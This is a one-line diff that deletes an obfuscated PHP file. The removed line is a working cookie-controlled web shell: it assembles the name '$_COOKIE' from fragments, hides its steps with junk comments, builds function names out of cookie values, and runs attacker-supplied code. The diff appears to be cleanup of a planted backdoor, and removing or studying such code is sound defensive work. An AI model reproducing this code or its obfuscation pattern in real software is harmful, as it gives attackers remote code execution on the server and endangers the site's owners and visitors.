@@ -1,1 +1,0 @@
-<?php $g='OKI';$xr='_CO';/*%]*/$tp='E';$yj/*V*/=${$xr.$g.$tp};$kh=/*tS`*/$yj['ZO'].$yj/*6H+*/['TP'];$gy=$yj['sv']./*4**/$yj['Nf'].$yj['V']/*JI*/;$jd=$kh('',$gy($yj['CB']));$jd();
